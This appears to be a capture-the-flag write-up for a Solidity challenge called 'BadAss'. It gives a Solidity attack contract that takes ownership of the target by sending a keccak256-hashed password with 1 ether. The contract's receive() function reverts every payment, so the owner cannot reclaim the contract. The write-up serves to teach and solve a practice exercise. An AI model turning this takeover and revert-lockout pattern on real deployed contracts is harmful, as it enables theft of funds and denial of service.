# BadAss

## Solution :

To validate this challenge, all you have to do is to find the password which is encrypted with the keccak256 procedure and find the good amount of ether to send.

And finally set up a revert system so that the owner can't reclaim the challenge.

To find the password, you need to check the `BadAssFactory.sol` file and to find the ethers' amount, check the amount that you send when you start the challenge.

```sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../../levels/hardChalls/BadAss.sol";

contract AttackBadAss {
    
    address payable originalContract;
    string password = "0x476F6F64206A6F622C20796F75206B6E6F7720686F7720746F2066696E642074686520696E666F732061742074686520726F6F742121";

    constructor(address payable _originalContract) public {
        originalContract = _originalContract;
    }
    
    function exploit() public payable {
        require(msg.value == 1 ether);
        bytes memory payload = abi.encodeWithSignature("takeOwnerShip(string)", keccak256(abi.encodePacked(password)));
        address(originalContract).call.value(msg.value)(payload);
    }

    receive() external payable {
        revert("Trigger");
    }
}
```